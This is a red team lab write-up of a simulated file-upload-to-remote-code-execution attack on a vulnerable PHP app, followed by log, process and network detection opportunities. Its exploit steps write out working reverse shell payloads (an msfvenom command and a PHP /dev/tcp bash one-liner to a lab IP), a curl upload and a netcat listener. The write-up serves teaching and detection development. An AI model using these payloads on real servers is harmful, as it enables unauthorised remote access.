# Simulated File Upload RCE Attack – Red Team Lab

This red team lab simulates a file upload vulnerability that leads to remote code execution (RCE). This attack was carried out in a controlled environment and documented for education and detection development purposes.

---

## Lab Setup

- Target: Vulnerable PHP web app running on Apache
- Attacker Box: Kali Linux
- Network: Isolated lab with DHCP
- Tools Used: Burp Suite, curl, nc (netcat)

---

## Attack Summary

1. Attacker discovers the file upload endpoint does not properly validate file type.
2. A `.php` reverse shell is uploaded using Burp Suite.
3. The shell is triggered remotely by navigating to the uploaded file.
4. Attacker gains remote access and runs commands as `www-data`.

---

## Exploit Steps

1. Crafting the Payload

Command:
msfvenom -p php/reverse_php LHOST=192.168.1.200 LPORT=4444 -f raw > shell.php

Alternatively, use a simple PHP reverse shell:

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.200/4444 0>&1'");
?>

---

2. Uploading the Shell

Command:
curl -F "file=@shell.php" http://target.local/upload.php

---

3. Trigger the Shell

Start a listener:
nc -lvnp 4444

Then visit in a browser:
http://target.local/uploads/shell.php

---

## Observed Artifacts

- Upload Path Accessed: /uploads/shell.php
- Process Spawned: /bin/bash -c ... from apache2 process
- Network Connection: Reverse shell from web server to attacker IP

---

## Detection Opportunities

Web logs:
- Look for uploads of .php, .jsp, .asp

Process logs:
- Apache or nginx spawning bash or powershell

Network logs:
- Outbound connection from web servers to unknown IPs

EDR/AV:
- Command execution triggered via PHP process

---

## Lessons Learned

- File upload flaws can lead to RCE if not properly validated
- Content inspection is more effective than extension checking
- Network and endpoint monitoring are key to spotting post-exploitation

---

This simulation was performed in a private lab using intentionally vulnerable code. No real systems or clients were targeted.

